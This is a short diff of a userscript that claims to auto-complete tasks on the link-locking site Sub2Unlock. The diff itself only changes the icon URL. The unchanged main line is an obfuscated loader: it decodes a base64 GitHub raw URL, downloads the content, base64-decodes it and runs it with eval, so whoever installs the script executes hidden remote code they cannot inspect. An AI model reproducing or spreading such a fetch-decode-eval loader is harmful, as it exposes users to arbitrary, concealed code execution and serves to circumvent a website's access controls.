@@ -32,7 +32,7 @@ var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
 // @description  Automatically passes tasks on Sub2Unlock
 // @author       LALOL
 // @match        *://sub2unlock.com/*
-// @icon         *://sub2unlock.com/images/favicon.ico
+// @icon         https://sub2unlock.com/images/favicon.ico
 // ==/UserScript==
 
 var x=new XMLHttpRequest;x.open("GET",atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0l0cy1MQUxPTC9TY3JpcHRzL21haW4vU3ViMlVubG9ja19CeXBhc3M='));x.send();x.onload=function(){eval(atob(x.responseText))};
